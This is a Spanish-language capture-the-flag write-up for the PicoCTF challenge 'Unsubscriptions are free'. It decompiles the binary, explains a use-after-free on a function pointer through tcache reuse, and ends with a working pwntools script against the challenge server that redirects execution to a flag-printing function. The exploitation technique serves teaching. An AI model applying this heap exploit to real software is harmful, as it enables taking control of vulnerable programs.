# Unsubscriptions are free - PicoCTF

## Reconocimiento

Descompilamos el binario con [[ghidra]] y veremos varias funciones interesantes. La primera:

```c
void hahaexploitgobrrr(void){
  FILE *__stream;
  int in_GS_OFFSET;
  char local_d8 [200];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  __stream = fopen("flag.txt","r");
  fgets(local_d8,200,__stream);
  fprintf(_stdout,"%s\n",local_d8);
  fflush(_stdout);
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}
```

Esta función imprime la flag desde un fichero `flag.txt`. Sin embargo no se llama desde ningún lugar, aunque vemos esta otra función:

```c
void s(void){
  printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
  puts("Thanks for subsribing! I really recommend becoming a premium member!");
  return;
}
```

Al ejecutar vemos que se imprime la dirección de la función *hahaexploitgobrrr*. Sigamos revisando para ver que podemos hacer con esta dirección.

Las funciones *main* y *printMenu* son bastante simples:

```c
void printMenu(void){
  puts("Welcome to my stream! ^W^");
  puts("==========================");
  puts("(S)ubscribe to my channel");
  puts("(I)nquire about account deletion");
  puts("(M)ake an Twixer account");
  puts("(P)ay for premium membership");
  puts("(l)eave a message(with or without logging in)");
  puts("(e)xit");
  return;
}

void main(void){
  undefined *puVar1;
  
  puVar1 = &stack0x00000004;
  setbuf(_stdout,(char *)0x0);
  user = malloc(4);
  do {
    printMenu(puVar1);
    processInput();
    doProcess(user);
  } while( true );
}
```

Las función *processInput* procesa el input del usuario, y *doProcess* llama a una función dado un puntero

```c
void processInput(void)

{
  code **ppcVar1;
  int iVar2;
  code *pcVar3;
  
  __isoc99_scanf(&DAT_08048f7f,&choice);
  iVar2 = toupper((int)choice);
  choice = (char)iVar2;
  switch(choice) {
  case 'E':
                    /* WARNING: Subroutine does not return */
    exit(0);
  default:
    puts("Invalid option!");
                    /* WARNING: Subroutine does not return */
    exit(1);
  case 'I':
    *user = i;
    break;
  case 'L':
    leaveMessage();
    break;
  case 'M':
    *user = m;
    puts("===========================");
    puts("Registration: Welcome to Twixer!");
    puts("Enter your username: ");
    ppcVar1 = user;
    pcVar3 = (code *)getsline();
    ppcVar1[1] = pcVar3;
    break;
  case 'P':
    *user = p;
    break;
  case 'S':
    if (user == (code **)0x0) {
      puts("Not logged in!");
    }
    else {
      *user = s;
    }
  }
  return;
}

void doProcess(code **param_1){
  (**param_1)();
  return;
}
```

Finalmente vemos la función *i*, que libera un puntero y puede llamarse varias veces:

```c
void i(void){
  int iVar1;
  int in_GS_OFFSET;
  char local_11;
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  puts("You\'re leaving already(Y/N)?");
  __isoc99_scanf(&DAT_08048f7f,&local_11);
  iVar1 = toupper((int)local_11);
  if (iVar1 == 0x59) {
    puts("Bye!");
    free(user);
  }
  else {
    puts("Ok. Get premium membership please!");
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}
```

Esto parece que no deberia ser así, si lo probamos da un error, lo que parece un bug del tipo ***Use after free***. Veremos si existe manera de escribir en dicho espacio de memoria.

Con *leaveMessage* podemos reservar un buffer de 8 bits y asignarlo.

```c
void leaveMessage(void){
  void *__buf;
  
  puts("I only read premium member messages but you can ");
  puts("try anyways:");
  __buf = malloc(8);
  read(0,__buf,8);
  return;
}
```

Con toda esta información podemos hacer lo siguiente:

1. Liberamos el buffer *user* con *i*. Que se irá a la *tcache*.
2. Reservaremos otro buffer con *leaveMessage*. Esta reserva vendrá de la *tcache*, por lo que apuntará a donde apuntaba *user*.
3. Escribiremos la dirección de *hahaexploitgobrrr* en dicho buffer.
4. Volveremos a liberar *user* para llamar a dicha función.

## Explotación

La realizaremos mediante un script en [[python]] y usando [[pwntools]]:

```python
#!/usr/bin/python3

from pwn import log, process, remote, time
import pwnlib.util.packing as pack

p = remote("mercury.picoctf.net", 58574)

p.sendline(b"S") # Get the memory leak

for i in range(9):
    try:
        inp = str(p.recvline()[21:].strip())[2:].strip("'") # Get the address from the leak
    except:
        log.info("")


inp = int(inp, 16) # Convert it to hex
log.info(f"{hex(inp)}")

p.sendline(b"I")    # Free user
p.sendline(b"Y")

p.sendline(b"L")    # Allocate the new buffer and write the address to it
time.sleep(1)
p.sendline(pack.p64(inp))

p.sendline(b"I")    # Free user again
p.sendline(b"Y")

p.interactive()
```